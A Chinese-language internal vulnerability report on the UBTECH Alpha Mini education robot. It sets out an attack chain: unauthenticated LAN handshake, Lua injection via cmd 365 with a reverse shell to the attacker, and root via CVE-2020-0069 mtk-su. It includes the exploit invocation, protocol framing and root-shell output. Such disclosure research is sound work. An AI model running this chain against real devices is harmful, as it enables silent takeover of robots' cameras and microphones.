---
编号: UBW-003
验证状态: 动态确认
严重程度: 高
披露状态: 内部研究
源平台: 优必选AI悟空EDU
源候选目录: 局域网内未授权LuaRCE漏洞
---
# UBW-003 UBTECH Alpha Mini（悟空 教育版）局域网未授权 RCE → root 提权 漏洞复现报告

## 1. 一句话结论

- # UBTECH Alpha Mini（悟空 教育版）局域网未授权 RCE → root 提权 漏洞复现报告
- \| 涉及发现 \| **U-03**（LAN 通道零鉴权）、**U-30**（cmd 365 Lua 注入 → system RCE）、**U-20**（CVE-2020-0069 mtk-su → root） \|
- ## 1. 漏洞概述
- 同网段任意主机接入后即可调用全部 93 个 handler。其中的 `DemoRunLuaScriptHandler`（cmd 365）
- 会把任意 Lua 脚本交给 SpeechActor（`/system/priv-app/`，**system uid**）内嵌的 LuaJava 引擎执行，

## 2. 影响产品与版本

- \| 目标设备 \| UBTECH Alpha Mini 悟空 国内教育版（实例名 `Dedu_<其他机器人设备_01>`） \|
- \| 固件版本 \| `v1.6.3.919`（2023-12，一代最新且已停更） \|
- Alpha Mini 的局域网命令通道（Netty + 明文 protobuf，mDNS 宣告随机端口）**握手不含任何凭据**，
- │     → 拿到 机器人IP + 随机端口(50000-51999) + 序列号 + 电量      【信息泄露】
- │     ← cmd 1000 isSuccess=True，泄露固件版本 v1.6.3.919           【U-03 认证绕过】
- - mDNS 服务类型 `_Dedu_mini_channel_server._tcp.local`，实例名 `Dedu_<序列号>`，

## 3. 验证状态

`动态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- 5. 一代产品线已停更是根因之一：建议厂商提供最终安全更新或明确停服公告。

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- # UBTECH Alpha Mini（悟空 教育版）局域网未授权 RCE → root 提权 漏洞复现报告
- \| 涉及发现 \| **U-03**（LAN 通道零鉴权）、**U-30**（cmd 365 Lua 注入 → system RCE）、**U-20**（CVE-2020-0069 mtk-su → root） \|
- **CVE-2020-0069（mtk-su）未修复**，可从 system 一步提权到 **root（uid=0）**。
- **影响**：同一局域网内任何设备（咖啡厅/教室/办公网）可零交互地完全控制机器人：
- 以 system 身份读写应用数据、调用摄像头/麦克风/人脸库，再以 root 读写全盘分区（含 system 分区）。
- │     → 拿到 机器人IP + 随机端口(50000-51999) + 序列号 + 电量      【信息泄露】

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# UBTECH Alpha Mini（悟空 教育版）局域网未授权 RCE → root 提权 漏洞复现报告

| 项 | 值 |
|---|---|
| 目标设备 | UBTECH Alpha Mini 悟空 国内教育版（实例名 `Dedu_<其他机器人设备_01>`） |
| 固件版本 | `v1.6.3.919`（2023-12，一代最新且已停更） |
| 系统 | Android 7.0 / NRD90M，MediaTek MT6755，内核 3.18.35，安全补丁 2018-05-05 |
| 测试机 | 与机器人同网段的普通 PC（无需任何凭据、无需配对、无需物理接触） |
| 复现日期 | 2026-07-29 |
| 涉及发现 | **U-03**（LAN 通道零鉴权）、**U-30**（cmd 365 Lua 注入 → system RCE）、**U-20**（CVE-2020-0069 mtk-su → root） |
| 授权边界 | 仅对自有设备、在隔离局域网内进行 |

---

## 1. 漏洞概述

Alpha Mini 的局域网命令通道（Netty + 明文 protobuf，mDNS 宣告随机端口）**握手不含任何凭据**，
同网段任意主机接入后即可调用全部 93 个 handler。其中的 `DemoRunLuaScriptHandler`（cmd 365）
会把任意 Lua 脚本交给 SpeechActor（`/system/priv-app/`，**system uid**）内嵌的 LuaJava 引擎执行，
该引擎 `openLibs()` 后**不做任何沙箱裁剪**，可直接 `luajava.bindClass("java.lang.Runtime")`
起子进程，从而以 **system 身份**执行任意命令。设备内核为 3.18.35（补丁级别 2018-05-05），
**CVE-2020-0069（mtk-su）未修复**，可从 system 一步提权到 **root（uid=0）**。

> 补充发现（本次实机新确认）：报告此前标注 SELinux 为 enforcing，实机 `getenforce` 返回
> **Permissive**，`/sys/fs/selinux/enforce` 为 `0`，提权路径上无 MAC 强制阻拦。

**影响**：同一局域网内任何设备（咖啡厅/教室/办公网）可零交互地完全控制机器人：
以 system 身份读写应用数据、调用摄像头/麦克风/人脸库，再以 root 读写全盘分区（含 system 分区）。

## 2. 攻击链

```
攻击者 PC（同网段）
   │  ① mDNS 查询 _Dedu_mini_channel_server._tcp.local
   │     → 拿到 机器人IP + 随机端口(50000-51999) + 序列号 + 电量      【信息泄露】
   ▼
② TCP 直连，发 commandId=0 握手（uuid 随机填，无任何 token/签名/配对码）
   │     ← cmd 1000 isSuccess=True，泄露固件版本 v1.6.3.919           【U-03 认证绕过】
   ▼
③ 发 cmd 365，body = RunLuaScriptRequest{ script }
   │     SpeechActor LuaJava 执行：Runtime.exec("/system/bin/sh")
   │     + java.net.Socket 反连攻击者 → 双向泵                          【U-30 完整 RCE】
   ▼
④ system 身份交互 shell（whoami = system, uid=1000）
   │     经 shell 写入 mtk-su（aarch64 ELF）
   ▼
⑤ 执行 mtk-su（CVE-2020-0069，MTK 内核命令队列驱动漏洞）
         ← uid=0(root)                                                 【U-20 权限提升】
```

## 3. 协议与漏洞细节

### 3.1 发现与帧格式

- mDNS 服务类型 `_Dedu_mini_channel_server._tcp.local`，实例名 `Dedu_<序列号>`，
  TXT 明文广播电量；端口每次通道重启随机（`Random.nextInt(2000)+50000`）。
- 帧：`FB BF | ver(1) | length(2,大端) | payload(protobuf) | 01 | ED`；全程明文无 TLS。

### 3.2 握手零凭据（U-03）

- LAN 握手判定条件仅 `header.commandId == 0`；`BluetoothHandShakeRequest` 的
  `uuid`/`sessionId` 均为客户端自报，服务端无校验、无拒绝路径（`onHandShaked()` 只是通知）。
- 响应 cmd 1000 `BluetoothShakeResponse` 含 `robotSoftVersionName`（固件版本）。
- 另有 `Policy.KickOff`：后到的无鉴权客户端会把在位合法客户端踢下线并接管会话。

### 3.3 cmd 365 Lua 注入（U-30）

- `DemoRunLuaScriptHandler` 除电量（999）与高危动作状态（998）外**无任何过滤**。
- 脚本被包装成 `ret = 0;<脚本>; _processor:finished();` 执行 ⇒ payload 必须是
  **纯语句式**（不能以 `return` 收尾，否则 `script compile error.`）。
- LuaJava `openLibs()` 后未回收任何库：`luajava.bindClass`/`newInstance` 可用，
  `Runtime.exec()` 起子进程不受 Android fork 限制，stdin/stdout/stderr 均可读写。
- 执行身份 = SpeechActor 进程身份 = **system（uid 1000）**（非 root、非 shell）。
- 长连接需 <7s 发一次心跳（payload 长 1 字节的帧即可）；冷启动首次调用 Master IPC
  可能等满 60 秒。

### 3.4 内核提权（U-20，CVE-2020-0069）

- 内核 3.18.35、补丁 2018-05-05 ⇒ MediaTek `mtk-su`（command queue 驱动越权）未修复。
- 推入公开的 `mtk-su`（aarch64）执行即得 uid=0；SELinux Permissive 无额外阻拦。

## 4. 复现方法（一键）

环境：Python 3.8+（仅标准库），与机器人同网段。

```bash
cd LuaRCE复现包
python exploit.py            # 全自动：mDNS 发现 → 握手 → system shell → 推 mtk-su → uid=0
# 或显式指定：
python exploit.py --robot 192.168.8.200 --port 50293 --lhost 192.168.8.186
```

脚本流程与输出一一对应上面的攻击链 ①–⑤，完整会话记录写入
`evidence/exploit_run.log`。

> 注意：机器人电量过低时 Lua 执行被拒（`errCode=999 "low power."`），请先充电。

包内文件：

```
LuaRCE复现包/
├── exploit.py                 # 一键复现主脚本
├── lib/                       # 协议库（帧编解码 / protobuf / mDNS 发现）
│   ├── lan_channel_client.py
│   └── lan_discover.py
├── tools/mtk-su               # CVE-2020-0069 提权程序（aarch64）
├── evidence/                  # 证据（运行日志、终端截图）
└── 漏洞复现报告.md            # 本文档
```

## 5. 复现证据

原始证据见 `evidence/` 目录：

- `exploit_run.log` — 一键脚本完整会话记录（发现 → 握手 → system shell → mtk-su 推送校验 → 提权）
- `2026-07-29_提权root证据.log` — `mtk-su -c id` 返回 `uid=0(root)` 的完整会话
- `2026-07-29_首次复现证据.log` — 首次实机复现的取证输出
- `01_发现与握手.png` — mDNS 发现 + 零凭据握手成功（固件 v1.6.3.919）
- `02_system身份shell.png` — cmd 365 反连 shell，`whoami = system`
- `03_提权root.png` — `mtk-su -c id` 返回 `uid=0(root)`

> 备注：SpeechActor 的 Lua 执行器为串行且较脆弱，连续高频调用会偶发 `Respond timeout`
> （cmd 366 无法打断阻塞中的脚本）。脚本已做探针确认 + 366 清理 + 泵 900 秒自毁兜底；
> 若遇到持续超时，等 10-15 分钟或重启机器人即可恢复。

关键输出摘录：

```
[+] 握手响应 cmd=1000 isSuccess=True  ← U-03 零鉴权实证
    固件版本 robotSoftVersionName = v1.6.3.919

$ whoami
system

$ id
uid=1000(system) gid=1000(system) groups=... context=u:r:system_app:s0

$ uname -a
Linux localhost 3.18.35 #1 SMP PREEMPT Tue Nov 21 20:35:33 HKT 2023 aarch64

$ /data/data/com.ubtechinc.mini.speechactor/mtk-su -c id
uid=0(root) gid=0(root) groups=0(root)
```

## 6. 修复建议

1. **LAN 通道接入鉴权**：握手引入设备绑定凭据（如配网时协商的密钥做 HMAC 挑战-响应），
   未通过鉴权前不开放任何业务 handler；关闭 `Policy.KickOff` 的无鉴权接管。
2. **Lua 沙箱化**：移除 `luajava` 与 `os`/`io` 的危险面，或干脆下线 cmd 365 的远程入口；
   至少做脚本签名校验。
3. **传输加密**：通道启用 TLS + 证书校验，杜绝明文嗅探与中间人。
4. **内核补丁**：升级内核/合入 CVE-2020-0069 修复；SELinux 回到 enforcing 并收敛
   priv-app 域权限。
5. 一代产品线已停更是根因之一：建议厂商提供最终安全更新或明确停服公告。

## 7. 时间线

- 2026-07-28：协议逆向与静态分析完成（见综合报告 §4）
- 2026-07-29：实机跑通 U-03 → U-30 → U-20 全链；确认 SELinux 实为 Permissive
